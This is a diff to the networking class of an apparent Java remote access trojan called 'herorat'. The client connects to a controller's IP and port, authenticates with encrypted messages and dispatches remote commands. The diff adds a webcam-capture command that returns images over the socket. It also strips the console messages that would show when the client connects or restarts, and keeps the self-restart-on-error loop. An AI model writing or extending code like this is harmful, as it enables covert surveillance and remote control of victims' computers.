@@ -7,6 +7,7 @@ import java.io.OutputStream;
 import java.net.Socket;
 
 import net.herorat.features.blocker.Blocker;
+import net.herorat.features.camgrab.CamGrab;
 import net.herorat.features.chat.Chat;
 import net.herorat.features.clipboard.Clipboard;
 import net.herorat.features.console.Console;
@@ -25,7 +26,7 @@ import net.herorat.features.suicide.Suicide;
 import net.herorat.features.system.System;
 import net.herorat.features.urlvisit.UrlVisit;
 import net.herorat.utils.Crypto;
-
+import net.herorat.utils.Logger;
 
 public class Network extends Thread
 {
@@ -49,10 +50,9 @@ public class Network extends Thread
 		this.isConnected = false;
 	}
 	
+	@Override
 	public void run()
 	{
-		java.lang.System.out.println("");
-		java.lang.System.out.println("Waiting for connection ...");
 	
 		do
 		{
@@ -66,6 +66,7 @@ public class Network extends Thread
 				
 				Information.send(outputstream, this.password);
 				String response = new String(Crypto.decrypt( Crypto.hexToByte(inputstream.readUTF())));
+				Logger.log("Response is: %s",response);
 				if (response.equalsIgnoreCase("ACCEPT_CONNECTION")) this.isConnected = true;
 				else sleep();
 			}
@@ -79,8 +80,6 @@ public class Network extends Thread
 			}
 		}
 		while (!this.isConnected);
-		
-		java.lang.System.out.println("Connection established");
 		
 		try
 		{
@@ -158,13 +157,14 @@ public class Network extends Thread
 						packet = new Packet17Suicide(inputstream);
 						Suicide.handle(packet.read(), outputstream);					// OK
 						break;
+					case 18:
+						packet = new Packet18CamGrab(inputstream);
+						CamGrab.handle(packet.read(),outputstream);
 				}
 			}
 		}
 		catch (Exception e)
 		{
-			java.lang.System.out.println("Connection closed");
-			java.lang.System.out.println("Restarting ...");
 			Network network = new Network(this.ip, this.port, this.password);
 			network.start();
 		}
